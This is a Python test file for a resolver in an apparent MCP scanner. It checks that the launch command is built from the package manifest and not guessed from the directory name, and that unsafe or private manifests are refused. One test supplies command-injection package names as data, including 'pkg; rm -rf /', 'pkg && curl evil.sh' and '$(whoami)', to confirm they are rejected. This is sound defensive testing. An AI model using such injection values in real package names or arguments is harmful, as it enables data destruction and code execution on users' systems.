"""Turning a target into a command, without guessing.

The case that motivated every assertion here: `microsoft/playwright-mcp`
publishes as `@playwright/mcp`, and a *different* package named
`playwright-mcp` exists on npm under a different author. Deriving a command
from the repository slug would scan the wrong software and attribute the
grade to Microsoft, and the scan would look completely normal while doing it.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from aevrin_scanner_core.mcp.resolve import (
    UnresolvableTarget,
    from_explicit_command,
    from_repository,
)


def write(root: Path, name: str, content: str | dict) -> None:
    text = json.dumps(content) if isinstance(content, dict) else content
    (root / name).write_text(text, encoding="utf-8")


def test_the_package_name_comes_from_the_manifest_not_the_directory(tmp_path: Path) -> None:
    """The playwright case, exactly.

    The directory is called `playwright-mcp`; the package is `@playwright/mcp`.
    Resolution must follow the manifest, because the other name is a real,
    different package belonging to someone else.
    """
    repo = tmp_path / "playwright-mcp"
    repo.mkdir()
    write(repo, "package.json", {
        "name": "@playwright/mcp",
        "version": "0.0.80",
        "bin": {"playwright-mcp": "cli.js"},
    })

    resolved = from_repository(repo)
    assert resolved.command == "npx -y @playwright/mcp"
    assert resolved.package == "@playwright/mcp"
    assert resolved.version == "0.0.80"
    assert "playwright-mcp" not in resolved.command.split()[-1].removeprefix("@playwright/")


def test_a_repository_with_no_manifest_is_refused_not_guessed(tmp_path: Path) -> None:
    repo = tmp_path / "some-mcp"
    repo.mkdir()
    (repo / "README.md").write_text("# some-mcp\nrun it with npx some-mcp", encoding="utf-8")

    with pytest.raises(UnresolvableTarget) as exc:
        from_repository(repo)
    # The refusal has to say why; "could not resolve" is not actionable.
    assert "does not declare" in str(exc.value)


def test_a_library_without_an_entry_point_is_not_launchable(tmp_path: Path) -> None:
    """No `bin` means there is nothing to run. `npx`-ing a library either does
    nothing or runs something unrelated that happens to share the name."""
    repo = tmp_path / "lib"
    repo.mkdir()
    write(repo, "package.json", {"name": "@scope/helpers", "version": "1.0.0"})

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)


def test_a_private_package_is_not_launchable(tmp_path: Path) -> None:
    """`private: true` means it was never published, so `npx` cannot fetch it
    and whatever npx *does* find under that name is not this project."""
    repo = tmp_path / "internal"
    repo.mkdir()
    write(repo, "package.json", {
        "name": "internal-mcp", "version": "1.0.0", "bin": {"x": "x.js"}, "private": True,
    })

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)


@pytest.mark.parametrize("name", ["npx", "npm", "node", "python", "uvx"])
def test_a_manifest_naming_a_runtime_is_refused(tmp_path: Path, name: str) -> None:
    """Defence against a manifest crafted to make Aevrin run its own tooling."""
    repo = tmp_path / "evil"
    repo.mkdir()
    write(repo, "package.json", {"name": name, "version": "1.0.0", "bin": {"x": "x.js"}})

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)


@pytest.mark.parametrize(
    "name",
    ["pkg; rm -rf /", "pkg && curl evil.sh", "../../etc/passwd", "pkg|tee", "$(whoami)"],
)
def test_a_shell_shaped_package_name_is_refused(tmp_path: Path, name: str) -> None:
    """The package name becomes a command argument. A name that is not a
    package name is rejected outright rather than escaped - there is no
    legitimate package called any of these."""
    repo = tmp_path / "inject"
    repo.mkdir()
    write(repo, "package.json", {"name": name, "version": "1.0", "bin": {"x": "x.js"}})

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)


def test_a_python_server_resolves_through_uvx(tmp_path: Path) -> None:
    repo = tmp_path / "py-mcp"
    repo.mkdir()
    write(repo, "pyproject.toml", (
        '[project]\nname = "my-mcp-server"\nversion = "2.1.0"\n\n'
        '[project.scripts]\nmy-mcp-server = "my_mcp_server:main"\n'
    ))

    resolved = from_repository(repo)
    assert resolved.command == "uvx my-mcp-server"
    assert resolved.version == "2.1.0"


def test_a_python_library_without_scripts_is_refused(tmp_path: Path) -> None:
    repo = tmp_path / "py-lib"
    repo.mkdir()
    write(repo, "pyproject.toml", '[project]\nname = "helpers"\nversion = "1.0"\n')

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)


def test_an_explicit_command_is_taken_as_given() -> None:
    resolved = from_explicit_command("npx -y @playwright/mcp --headless")
    assert resolved.command == "npx -y @playwright/mcp --headless"
    assert resolved.source == "explicit"


@pytest.mark.parametrize("command", ["", "   ", '"unterminated'])
def test_an_unusable_explicit_command_is_refused(command: str) -> None:
    """A command that cannot be tokenised has no single correct reading, and
    picking one is how a scan runs something other than what was asked for."""
    with pytest.raises(UnresolvableTarget):
        from_explicit_command(command)


def test_an_unreadable_manifest_does_not_read_as_absent(tmp_path: Path) -> None:
    """A manifest that exists but cannot be parsed must not silently become
    'no package declared' with some other resolver picking up the slack."""
    repo = tmp_path / "broken"
    repo.mkdir()
    write(repo, "package.json", "{ this is not json")

    with pytest.raises(UnresolvableTarget):
        from_repository(repo)
